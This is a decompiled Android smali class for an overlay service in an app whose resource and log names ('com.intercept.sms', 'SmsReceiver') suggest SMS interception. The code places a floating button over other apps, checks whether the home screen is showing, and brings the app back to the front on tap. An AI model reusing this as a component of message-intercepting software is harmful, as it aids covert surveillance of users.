.class public Ltop/xy12/codetransporter/service/FloatService;
.super Landroid/app/Service;
.source "FloatService.java"


# static fields
.field public static OPERATION:Ljava/lang/String; = "\u662f\u5426\u9700\u8981\u5f00\u542f"

.field public static OPERATION_HIDE:I = 0x2

.field public static OPERATION_SHOW:I = 0x1


# instance fields
.field HANDLE_CHECK_ACTIVITY:I

.field btnView:Landroid/widget/Button;

.field isAdded:Ljava/lang/Boolean;

.field private mHandler:Landroid/os/Handler;

.field params:Landroid/view/WindowManager$LayoutParams;

.field windowManager:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 34
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 42
    iput v0, p0, Ltop/xy12/codetransporter/service/FloatService;->HANDLE_CHECK_ACTIVITY:I

    .line 171
    new-instance v0, Ltop/xy12/codetransporter/service/FloatService$2;

    invoke-direct {v0, p0}, Ltop/xy12/codetransporter/service/FloatService$2;-><init>(Ltop/xy12/codetransporter/service/FloatService;)V

    iput-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->mHandler:Landroid/os/Handler;

    return-void
.end method

.method static synthetic access$000(Ltop/xy12/codetransporter/service/FloatService;)Landroid/os/Handler;
    .locals 0

    .line 34
    iget-object p0, p0, Ltop/xy12/codetransporter/service/FloatService;->mHandler:Landroid/os/Handler;

    return-object p0
.end method

.method private createWindowView(Landroid/content/Context;)V
    .locals 3

    const-string v0, "SmsReceiver"

    const-string v1, "createWindowView"

    .line 69
    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 70
    new-instance v0, Landroid/widget/Button;

    invoke-virtual {p0}, Ltop/xy12/codetransporter/service/FloatService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->btnView:Landroid/widget/Button;

    .line 71
    sget v1, Lcom/intercept/sms/R$drawable;->ic_launcher_background:I

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setBackgroundResource(I)V

    .line 72
    invoke-virtual {p0}, Ltop/xy12/codetransporter/service/FloatService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    .line 73
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->windowManager:Landroid/view/WindowManager;

    .line 74
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    .line 75
    iget-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->btnView:Landroid/widget/Button;

    new-instance v1, Ltop/xy12/codetransporter/service/FloatService$$ExternalSyntheticLambda1;

    invoke-direct {v1, p1}, Ltop/xy12/codetransporter/service/FloatService$$ExternalSyntheticLambda1;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 81
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/16 v0, 0x20

    iput v0, p1, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 85
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/4 v0, 0x1

    iput v0, p1, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 87
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0xc8

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 88
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 89
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/4 v1, 0x3

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 90
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/4 v1, 0x0

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 91
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 93
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt p1, v1, :cond_0

    .line 94
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x7f6

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->type:I

    goto :goto_0

    .line 96
    :cond_0
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x7d2

    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 99
    :goto_0
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->btnView:Landroid/widget/Button;

    new-instance v1, Ltop/xy12/codetransporter/service/FloatService$1;

    invoke-direct {v1, p0}, Ltop/xy12/codetransporter/service/FloatService$1;-><init>(Ltop/xy12/codetransporter/service/FloatService;)V

    invoke-virtual {p1, v1}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 125
    iget-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->windowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Ltop/xy12/codetransporter/service/FloatService;->btnView:Landroid/widget/Button;

    iget-object v2, p0, Ltop/xy12/codetransporter/service/FloatService;->params:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {p1, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 126
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Ltop/xy12/codetransporter/service/FloatService;->isAdded:Ljava/lang/Boolean;

    return-void
.end method

.method private getHomeApplicationList()Ljava/util/List;
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 158
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 159
    invoke-virtual {p0}, Ltop/xy12/codetransporter/service/FloatService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 160
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.intent.action.MAIN"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v3, "android.intent.category.HOME"

    .line 161
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v3, 0x10000

    .line 162
    invoke-virtual {v1, v2, v3}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v1

    .line 163
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/content/pm/ResolveInfo;

    .line 164
    iget-object v2, v2, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    iget-object v2, v2, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    invoke-interface {v0, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 166
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\u4e3b\u5c4f\u5e55\u5e94\u7528\u5217\u8868"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "henry"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-object v0
.end method

.method private isAtHome()Z
    .locals 3

    const-string v0, "activity"

    .line 134
    invoke-virtual {p0, v0}, Ltop/xy12/codetransporter/service/FloatService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    const/4 v1, 0x1

    .line 135
    invoke-virtual {v0, v1}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    .line 136
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\u662f\u5426\u5728\u4e3b\u9875\u9762"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "henry"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 137
    invoke-direct {p0}, Ltop/xy12/codetransporter/service/FloatService;->getHomeApplicationList()Ljava/util/List;

    move-result-object v1

    const/4 v2, 0x0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    invoke-static {v0}, Ltop/xy12/codetransporter/util/SimUtils$$ExternalSyntheticApiModelOutline0;->m(Landroid/app/ActivityManager$RunningTaskInfo;)Landroid/content/ComponentName;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v1, v0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v0

    return v0
.end method

.method static synthetic lambda$createWindowView$0(Landroid/content/Context;Landroid/view/View;)V
    .locals 1

    const-string p1, "SmsReceiver"

    const-string v0, "\u56de\u5230app"

    .line 76
    invoke-static {p1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 77
    invoke-static {p0}, Ltop/xy12/codetransporter/util/TgSystem;->setTopApp(Landroid/content/Context;)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 0

    .line 63
    invoke-direct {p0, p0}, Ltop/xy12/codetransporter/service/FloatService;->createWindowView(Landroid/content/Context;)V

    .line 64
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    const-string v0, "SmsReceiver"

    const-string v1, "onDestroy "

    .line 208
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 209
    iget-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->isAdded:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 210
    iget-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->windowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Ltop/xy12/codetransporter/service/FloatService;->btnView:Landroid/widget/Button;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 212
    :cond_0
    iget-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->mHandler:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 213
    iput-object v1, p0, Ltop/xy12/codetransporter/service/FloatService;->windowManager:Landroid/view/WindowManager;

    .line 214
    iput-object v1, p0, Ltop/xy12/codetransporter/service/FloatService;->mHandler:Landroid/os/Handler;

    .line 215
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    .line 52
    sget-object v0, Ltop/xy12/codetransporter/service/FloatService;->OPERATION:Ljava/lang/String;

    const/4 v1, 0x3

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 53
    sget v1, Ltop/xy12/codetransporter/service/FloatService;->OPERATION_SHOW:I

    if-ne v0, v1, :cond_0

    .line 54
    iget-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->mHandler:Landroid/os/Handler;

    iget v1, p0, Ltop/xy12/codetransporter/service/FloatService;->HANDLE_CHECK_ACTIVITY:I

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    goto :goto_0

    .line 55
    :cond_0
    sget v1, Ltop/xy12/codetransporter/service/FloatService;->OPERATION_HIDE:I

    if-ne v0, v1, :cond_1

    .line 56
    iget-object v0, p0, Ltop/xy12/codetransporter/service/FloatService;->mHandler:Landroid/os/Handler;

    iget v1, p0, Ltop/xy12/codetransporter/service/FloatService;->HANDLE_CHECK_ACTIVITY:I

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeMessages(I)V

    .line 58
    :cond_1
    :goto_0
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result p1

    return p1
.end method
